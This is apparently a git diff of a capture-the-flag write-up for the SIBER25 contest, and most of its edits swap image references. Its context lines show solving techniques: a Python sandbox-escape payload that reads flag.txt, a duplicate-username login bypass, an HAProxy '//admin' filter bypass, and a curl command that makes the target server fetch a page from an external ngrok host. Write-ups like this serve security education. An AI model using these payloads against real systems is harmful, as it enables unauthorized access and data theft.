@@ -22,7 +22,7 @@ Challenge Creator: @penguincat
 
 Given the credentials for connecting and each time have 5 tries, while the 5th one will never show the results, so 4 try only
 
-![](assets/img/siber-siaga-25/image1.png)
+![](assets/img/siber-siaga-25/image6.png)
 
 Here is the request of my try and i combine it to get the flag
 
@@ -56,11 +56,11 @@ Flag Format: SIBER25{flag} Challenge Creator: @penguincat
 
 **Answer**
 
-![](assets/img/siber-siaga-25/image2.png)
+![](assets/img/siber-siaga-25/image12.png)
 
 Just enter admin and you will get the flag
 
-![](assets/img/siber-siaga-25/image3.png)
+![](assets/img/siber-siaga-25/image5.png)
 
 >Flag: `SIBER25{w3lc0m3_70_7h3_c00l357_c17y}`
 {: .prompt-tip}
@@ -77,9 +77,9 @@ Challenge Creator: @penguincat Flag Format: SIBER25{flag}
 
 **Answer:**
 
-![](assets/img/siber-siaga-25/image4.png)
+![](assets/img/siber-siaga-25/image3.png)
 
-![](assets/img/siber-siaga-25/image5.png)
+![](assets/img/siber-siaga-25/image14.png)
 
 Based on the source code given, you can see flag.txt which means the server will also have a file named flag.txt in it, now we just need to find ways to exploit it.
 
@@ -99,7 +99,7 @@ Until i get this one
 __builtins__.__dict__['pr'+'int'](open('flag.txt').read())
 ```
 
-![](assets/img/siber-siaga-25/image6.png)
+![](assets/img/siber-siaga-25/image9.png)
 
 >Flag: `SIBER25{St1ck_70_7h3_5toryl1n3!}`
 {: .prompt-tip}
@@ -161,7 +161,7 @@ Challenge Creator: @identities
 
 Given an image file and .txt file. I immediately opened the image file using Exterro FTK Imager.
 
-![](assets/img/siber-siaga-25/image7.png)
+![](assets/img/siber-siaga-25/image2.png)
 
 As I was traversing through the image file, I found multiple image files in the recycle bin. When I click it to read as ASCII, I get the flag : 
 
@@ -184,15 +184,15 @@ Challenge Creator: @identities
 
 Just like the Dumpster challenge, I quickly open the image file given using  Exterro FTK Imager. 
 
-![](assets/img/siber-siaga-25/image8.png)
+![](assets/img/siber-siaga-25/image7.png)
 
 I found out there was multiple interesting file directories, and when for looking.
 
-![](assets/img/siber-siaga-25/image9.png)
+![](assets/img/siber-siaga-25/image2.png)
 
 In the explorer folder, I noticed there are multiple deleted files. So I try to export them to my laptop and try to see it using tools named Thumb cache viewer.
 
-![](assets/img/siber-siaga-25/image10.png)
+![](assets/img/siber-siaga-25/image8.png)
 
 I check every single file and I see the flag in an image. Then I merged all the info from all the images and got the flag.
 
@@ -221,7 +221,7 @@ apktool d app-debug.apk
 
 After that, im opening vscode and just find `SIBER25{`
 
-![](assets/img/siber-siaga-25/image11.png)
+![](assets/img/siber-siaga-25/image14.png)
 
 Sorry for unintended solution 🙏
 
@@ -244,7 +244,7 @@ I'm using Github Copilot with Claude Sonnet 4 as a model in this challenge, here
 
 So, here's the [code](https://drive.google.com/file/d/1dx0XkrEyqQ6Pv_3Ro1lp_v8DyNQAeSd9/view?usp=sharing) for solving the challenge. Below is one of the result from executing the code.
 
-![](assets/img/siber-siaga-25/image12.png)
+![](assets/img/siber-siaga-25/image11.png)
 
 >Flag: `SIBER25{l3arn1ng_m4ch1n3_l3arn1ng}`
 {: .prompt-tip}
@@ -393,7 +393,7 @@ Challenge Creator: @hanming0510
 
 The system allows users to login to the system.
 
-![](assets/img/siber-siaga-25/image13.png)
+![](assets/img/siber-siaga-25/image4.png)
 
 With an admin account, users will be able to access more data than the normal one. By specifying twice the username, the admin will be allowed but the validation is being done as guest login information. Thus, admin access will be granted.
 
@@ -472,7 +472,7 @@ Challenge Creator: @penguincat
 
 Users are able to login if their accounts are created by Admin (so-called private & invitation only access)
 
-![](assets/img/siber-siaga-25/image14.png)
+![](assets/img/siber-siaga-25/image10.png)
 
 To obtain access we need to access `/admin`. But, `/admin` is blocked by default. HAProxy only block literal words like `/admin` but can be bypassed by writing as `//admin`.
 
@@ -592,7 +592,7 @@ curl -X POST -d "url=https://a0e6375f976e.ngrok-free.app/test.html" "http://5.22
 With the file, Extract flag from the pdf
 
 ```bash
-pdf –saveall flag_result.pdf
+pdfdetach –saveall flag_result.pdf
 ```
 
 After extracting, Extract text from the flag.txt to obtain the flag.
